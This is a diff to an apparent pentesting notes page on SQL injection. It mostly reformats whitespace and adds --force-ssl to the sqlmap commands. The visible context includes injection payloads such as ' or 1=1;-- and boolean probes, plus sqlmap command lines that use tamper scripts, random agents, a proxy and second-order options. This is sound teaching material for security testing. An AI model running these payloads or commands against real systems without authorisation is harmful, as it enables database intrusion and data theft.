@@ -5,16 +5,15 @@ description: SQL injection is a web security vulnerability that allows an attack
 ---
 
 **HEY!!** Quick access:
+
 - Quick n' dirty `sqlmap` command?? [Here it is!!](#first-go-to-command)
 - [SQLi cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-
 
 > Important: Appart from certain examples. Most of the payloads listed here do not contain the initial `'` for the injections. This is for 2 reasons: If the injected parameter was a number you most likely do not need the `'`, and because it breaks the syntax highlighting. The initial `'` is obvious and I think is better to understand the payloads with some colors than to have the obvious quote at the beggining of each payload.
 
 ## Visual example
 
-Lets say a request is made to a server to fetch the list of products within a category. The request could look like this: 
-
+Lets say a request is made to a server to fetch the list of products within a category. The request could look like this:
 
 ```http
 GET /products?category={{ injection Gifts } url-all } HTTP/1.1
@@ -32,8 +31,6 @@ If we add single quotes, we can modify the query and retrieve every product (eve
 ```sql
 SELECT * FROM products WHERE category='{{ injection ' or 1=1;-- }}' AND released=1
 ```
-
-
 
 ## Basic injections
 
@@ -236,7 +233,6 @@ wiener{{ separator ~ }}peter
 carlos{{ separator ~ }}montoya
 ```
 
-
 ## Examining the database
 
 ### Generic info
@@ -312,7 +308,7 @@ An example could be an analytics cookie that if it is fond on the database, show
 
 Abusing such behaviours, you could check if there is an injection point with payloads like the following two (to test if there is different responses):
 
-```
+```sql
 {{ sqli-valid-value VALID_TOKEN }}' AND '1337'='1337
 {{ sqli-valid-value VALID_TOKEN }}' AND '1337'='7777
 ```
@@ -629,7 +625,6 @@ alias sqlmap="{{ python-interpreter python }} {{ sqlmap-dir sqlmap-dev }}/sqlmap
 </template>
 </smart-tabs>
 
-
 ### Basic usage
 
 ```bash
@@ -653,14 +648,14 @@ My typical first go-to command would be something like this (having a request fr
 <template v-slot:tamper>
 
 ```bash
-sqlmap -r "{{ req-file vulnerable.req }}" --tamper={{ tamper-file between.py }} --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent --proxy "{{ proxy-url http://127.0.0.1:8080 }}"
+sqlmap -r "{{ req-file vulnerable.req }}" --tamper={{ tamper-file between.py }} --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent --proxy "{{ proxy-url http://127.0.0.1:8080 }}" --force-ssl
 ```
 
 </template>
 <template v-slot:no-tamper>
 
 ```bash
-sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent --proxy "{{ proxy-url http://127.0.0.1:8080 }}"
+sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent --proxy "{{ proxy-url http://127.0.0.1:8080 }}" --force-ssl
 ```
 
 </template>
@@ -673,14 +668,14 @@ sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={
 <template v-slot:tamper>
 
 ```bash
-sqlmap -r "{{ req-file vulnerable.req }}" --tamper={{ tamper-file between.py }} --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent
+sqlmap -r "{{ req-file vulnerable.req }}" --tamper={{ tamper-file between.py }} --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }} --random-agent --force-ssl
 ```
 
 </template>
 <template v-slot:no-tamper>
 
 ```bash
-sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }}  --random-agent
+sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={{ sqlmap-risk 1 }} --level={{ sqlmap-level 1 }} --random-agent --force-ssl
 ```
 
 </template>
@@ -689,12 +684,13 @@ sqlmap -r "{{ req-file vulnerable.req }}" --delay={{ request-delay 1 }} --risk={
 </template>
 </smart-tabs>
 
+> When using a request file with `-r` you will need to specify ` --force-ssl` in order to make https requests since `sqlmap` defaults to http.
+
 ### Examples - Exploitation
 
-
 ### Tamper scripts
-Amazing functionality. Basically `sqlmap` offers a way for you to run custom python code to process payloads before sending them, which is very handy to bypass character restrictions and exploit complex second-order injections.
 
+Amazing functionality. Basically `sqlmap` offers a way for you to run custom python code to process payloads before sending them, which is very handy to bypass character restrictions and exploit complex second-order injections.
 
 #### Predefined tamper scripts
 
@@ -750,14 +746,14 @@ You can specify such request via a URL (with `--second-url`) or via a request fi
 <template v-slot:url>
 
 ```bash
-sqlmap -r injection.req -p products --second-url "{{ second-order-url https://vulnerable.net/info.php?user=5 }}"
+sqlmap -r injection.req -p products --second-url "{{ second-order-url https://vulnerable.net/info.php?user=5 }}" --force-ssl
 ```
 
 </template>
 <template v-slot:file>
 
 ```bash
-sqlmap -r injection.req -p products --second-req "{{ second-order-req second-order.req }}"
+sqlmap -r injection.req -p products --second-req "{{ second-order-req second-order.req }}" --force-ssl
 ```
 
 </template>
@@ -802,4 +798,3 @@ def tamper(payload, **kwargs):
 ```
 
 > Here the **Copy As Python-Requests** Burp extension comes pretty handy. Find it at the [bappstore](https://portswigger.net/bappstore/b324647b6efa4b6a8f346389730df160).
-
